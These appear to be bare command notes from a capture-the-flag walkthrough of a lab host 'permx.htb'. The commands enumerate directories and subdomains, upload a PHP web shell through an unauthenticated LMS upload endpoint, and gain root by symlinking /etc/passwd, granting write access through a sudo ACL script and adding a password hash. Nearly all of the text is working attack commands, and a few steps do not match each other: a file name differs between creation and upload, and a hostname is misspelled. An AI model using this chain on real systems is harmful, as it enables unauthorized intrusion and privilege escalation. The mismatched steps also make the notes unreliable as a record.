```bash
gobuster dir -u permx.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html
```

```bash
ffuf -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.permx.htb' -fw 18
```


```shell
$ echo '<?php system("id"); ?>' > rce.php
$ curl -F 'bigUploadFile=@reverse.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.
$ curl 'http://lsm.permx.htb/main/inc/lib/javascript/bigupload/files/reverse.php'

```

```shell
openssl passwd newpassword
```

```shell
ln -s /etc/passwd file
sudo /opt/acl.sh mtz rw ~/file
vi file
```
